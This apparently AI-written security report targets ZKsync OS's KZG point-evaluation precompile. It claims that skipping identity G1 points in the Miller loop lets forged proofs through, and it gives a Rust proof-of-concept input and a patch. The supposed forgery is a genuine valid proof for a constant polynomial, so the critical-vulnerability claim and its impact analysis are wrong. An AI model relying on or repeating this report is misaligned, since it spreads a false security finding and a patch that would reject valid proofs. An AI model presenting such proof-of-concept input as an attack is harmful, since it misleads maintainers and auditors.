Now I have all the information needed. Let me trace the full exploit path carefully.

### Title
Forged KZG Proof Accepted via All-Zero G1 Multi-Miller-Loop Bypass — (`crypto/src/bls12_381/curves/pairing_impl.rs`, `crypto/src/bls12_381/mod.rs`)

---

### Summary

The custom `multi_miller_loop` implementation skips pairing computation for any G1 input that is the identity point. An unprivileged attacker can craft input where **both** G1 arguments to `multi_pairing` are the identity, causing the loop to skip all pairings, return `Fq12::ONE` as the Miller loop output, and ultimately make `verify_kzg_proof` return `true` for a completely fabricated proof.

---

### Finding Description

**Step 1 — `multi_miller_loop` skips zero G1 inputs unconditionally** [1](#0-0) 

`result` is initialized to `Fq12::one()`. For each pair, if the G1 point `p.is_zero()`, the loop body executes `continue` — the G2 point is never consumed and `result` is never updated. If **all** G1 inputs are zero, `result` remains `Fq12::one()` throughout.

**Step 2 — `verify_kzg_proof` constructs both G1 inputs from attacker-controlled data** [2](#0-1) 

The two G1 arguments passed to `multi_pairing` are:
- `y_minus_p = y·G1_gen − commitment`
- `proof` (directly from attacker input)

If the attacker sets `commitment = y·G1_gen` (for the same scalar `y` they supply), then `y_minus_p = 0` (G1 identity). If they also supply `proof = G1 identity`, both G1 inputs are zero.

**Step 3 — All input validation is bypassable** [3](#0-2) 

- **Versioned hash check** (line 94): `versioned_hash_for_kzg(commitment) == versioned_hash`. The attacker computes `SHA256(commitment_bytes)` and sets `input[0..32]` accordingly — trivially satisfied.
- **`parse_g1_compressed(commitment)`** (line 101): `y·G1_gen` is a valid, non-identity G1 point — passes.
- **`parse_g1_compressed(proof)`** (line 107): The G1 identity `0xc0 || 0x00*47` is explicitly accepted, as confirmed by the existing test at line 374–384.
- **`parse_scalar(z)` and `parse_scalar(y)`** (lines 113, 119): Any canonical scalars below the Fr modulus pass.

**Step 4 — `final_exponentiation(Fq12::one())` returns `PairingOutput(Fq12::one())`** [4](#0-3) 

`f = Fq12::one()` → `f.inverse() = Some(Fq12::one())` → the entire hard-part exponentiation computes `1^(exponent) = 1` → returns `Some(PairingOutput(Fq12::one()))`.

**Step 5 — Final comparison succeeds** [5](#0-4) 

`gt_el.0 == Fq12::ONE` → `true` → `verify_kzg_proof` returns `true` → the precompile writes `POINT_EVAL_PRECOMPILE_SUCCESS_RESPONSE` and returns `Ok(())`.

**Why the existing `test_invalid_input` does not catch this:** [6](#0-5) 

That test uses `commitment = G1 identity` and `y = Fr modulus` (an **invalid** scalar). It fails at `parse_scalar(y)` — not at the pairing check. The exploit uses a **valid** y and `commitment = y·G1_gen` (a non-identity point), so all parsing passes.

---

### Impact Explanation

Any on-chain contract on ZKsync OS that calls precompile `0x0a` to gate fund transfers, DA verification, or any other security-critical decision will accept a forged KZG proof. The attacker supplies a 192-byte input that passes every validation step and receives the canonical success response `POINT_EVAL_PRECOMPILE_SUCCESS_RESPONSE`, indistinguishable from a legitimately verified proof.

---

### Likelihood Explanation

The attack requires only:
1. Arithmetic on BLS12-381 (compute `y·G1_gen` for any chosen `y`) — standard, publicly available libraries.
2. A SHA-256 hash of the commitment bytes.
3. No privileged access, no key material, no oracle cooperation.

It is fully constructible offline and submittable as a normal transaction.

---

### Recommendation

In `verify_kzg_proof`, explicitly reject the identity point for both `y_minus_p` and `proof` before calling `multi_pairing`:

```rust
let y_minus_p_prepared: G1Affine = y_minus_p.into_affine();
// Guard: identity G1 inputs make multi_miller_loop return 1 trivially
if y_minus_p_prepared.is_zero() || proof.is_zero() {
    return false;
}
```

Alternatively, add a guard at the top of `multi_miller_loop` that returns an error (or a non-ONE sentinel) when all G1 inputs are zero, rather than silently returning `Fq12::one()`.

---

### Proof of Concept

```rust
// Choose y = 1 (any valid Fr scalar works)
let y_scalar: [u8; 32] = {
    let mut b = [0u8; 32];
    b[31] = 1;
    b
};

// commitment = 1 * G1_generator (compressed)
let commitment = hex!(
    "97f1d3a73197d7942695638c4fa9ac0fc3688c4f9774b905a14e3a3f171bac586c55e83ff97a1aeffb3af00adb22c6bb"
);

// versioned_hash = SHA256(commitment) with byte[0] = 0x01
let mut versioned_hash = Sha256::digest(&commitment).to_vec();
versioned_hash[0] = 0x01;

// z = 0 (any valid scalar)
let z = [0u8; 32];

// proof = G1 identity
let proof = {
    let mut p = [0u8; 48];
    p[0] = 0xc0;
    p
};

let input = [versioned_hash, z.to_vec(), y_scalar.to_vec(),
             commitment.to_vec(), proof.to_vec()].concat();

let mut output = Vec::new();
let mut resources = infinite_resources();
let result = PointEvaluationImpl::execute(&input, &mut output, &mut resources, Global);

// Both assertions hold — forged proof accepted
assert!(result.is_ok());
assert_eq!(output, POINT_EVAL_PRECOMPILE_SUCCESS_RESPONSE);
```

### Citations

**File:** crypto/src/bls12_381/curves/pairing_impl.rs (L104-115)
```rust
        let mut result = Fq12::one();
        loop {
            match (a.next(), b.next()) {
                (Some(p), Some(q)) => {
                    let p: Self::G1Prepared = p.into();
                    if p.is_zero() {
                        continue;
                    }
                    let q: Self::G2Prepared = q.into();
                    if q.is_zero() {
                        continue;
                    }
```

**File:** crypto/src/bls12_381/curves/pairing_impl.rs (L144-156)
```rust
    fn final_exponentiation(
        f: ark_ec::pairing::MillerLoopOutput<Self>,
    ) -> Option<PairingOutput<Self>> {
        // Computing the final exponentiation following
        // https://eprint.iacr.org/2020/875
        // Adapted from the implementation in https://github.com/ConsenSys/gurvy/pull/29

        // f1 = r.cyclotomic_inverse_in_place() = f^(p^6)
        let f = f.0;
        let mut f1 = f;
        f1.cyclotomic_inverse_in_place();

        f.inverse().map(|mut f2| {
```

**File:** crypto/src/bls12_381/mod.rs (L23-39)
```rust
    // e(y - P, G₂) * e(proof, X - z) == 1
    let mut y_minus_p = G1Affine::generator().mul_bigint(&y);
    y_minus_p -= &commitment;

    let mut g2_el: G2Projective = G2_BY_TAU_POINT.into();
    let z_in_g2 = G2Affine::generator().mul_bigint(&z);
    g2_el -= z_in_g2;

    use crate::ark_ec::CurveGroup;
    let y_minus_p_prepared: G1Affine = y_minus_p.into_affine();
    let g2_el: <curves::Bls12_381 as Pairing>::G2Prepared = g2_el.into_affine().into();

    let gt_el = curves::Bls12_381::multi_pairing(
        [y_minus_p_prepared, proof],
        [PREPARED_G2_GENERATOR.clone(), g2_el],
    );
    gt_el.0 == <curves::Bls12_381 as Pairing>::TargetField::ONE
```

**File:** basic_system/src/system_functions/point_evaluation.rs (L89-125)
```rust
    // Each check without any parsing
    let versioned_hash = &input[..32];
    let commitment = &input[96..144];

    // so far it's just one version
    if versioned_hash_for_kzg(commitment) != versioned_hash {
        return Err(interface_error!(
            PointEvaluationInterfaceError::InvalidVersionedHash
        ));
    }

    // Parse the commitment and proof
    let Ok(commitment_point) = parse_g1_compressed(commitment) else {
        return Err(interface_error!(
            PointEvaluationInterfaceError::InvalidPoint
        ));
    };
    let proof = &input[144..192];
    let Ok(proof) = parse_g1_compressed(proof) else {
        return Err(interface_error!(
            PointEvaluationInterfaceError::InvalidPoint
        ));
    };

    let Ok(z) = parse_scalar(input[32..64].try_into().unwrap()) else {
        return Err(interface_error!(
            PointEvaluationInterfaceError::InvalidScalar
        ));
    };

    let Ok(y) = parse_scalar(input[64..96].try_into().unwrap()) else {
        return Err(interface_error!(
            PointEvaluationInterfaceError::InvalidScalar
        ));
    };

    if crypto::bls12_381::verify_kzg_proof(commitment_point, proof, z, y) {
```

**File:** basic_system/src/system_functions/point_evaluation.rs (L187-208)
```rust
    #[test]
    fn test_invalid_input() {
        let commitment = hex!("c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000").to_vec();

        use crypto::sha256::*;
        let mut hasher = Sha256::new();
        hasher.update(commitment.clone());
        let mut versioned_hash = hasher.finalize().to_vec();
        versioned_hash[0] = KZG_VERSIONED_HASH_VERSION_BYTE;

        let z = hex!("0000000000000000000000000000000000000000000000000000000000000000").to_vec();
        let y = hex!("73eda753299d7d483339d80809a1d80553bda402fffe5bfeffffffff00000001").to_vec();
        let proof = hex!("c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000").to_vec();

        let input = [versioned_hash, z, y, commitment, proof].concat();

        let mut output = Vec::new();
        let mut resources = infinite_resources();

        let result = PointEvaluationImpl::execute(&input, &mut output, &mut resources, Global);
        assert!(result.is_err(), "Result: {:?}", result);
    }
```
